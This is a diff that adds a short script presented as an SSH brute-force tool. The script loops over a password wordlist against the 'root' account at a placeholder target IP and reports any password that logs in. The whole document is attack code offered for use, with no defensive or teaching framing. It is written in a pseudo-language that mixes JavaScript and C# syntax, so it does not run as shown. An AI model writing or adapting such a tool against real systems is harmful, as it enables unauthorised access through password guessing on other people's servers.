@@ -1,0 +1,32 @@
+// Brute-force tool for SSH login using a wordlist
+
+var targetIP = "192.168.1.10"     // Replace with target IP
+var username = "root"             // Target username
+var wordlistFile = File("/home/user/wordlists/common.txt") // Replace with your wordlist
+
+if (!wordlistFile.exists()) {
+    print("Wordlist not found.")
+    return
+}
+
+var passwords = wordlistFile.readLines()
+
+foreach (var password in passwords) {
+    print("Trying password: " + password)
+
+    var conn = SSH(targetIP)
+
+    if (conn.connect()) {
+        if (conn.login(username, password)) {
+            print("Success! Password found: " + password)
+            break
+        } else {
+            print("Incorrect password: " + password)
+        }
+
+        conn.disconnect()
+    } else {
+        print("Connection failed.")
+        break
+    }
+}
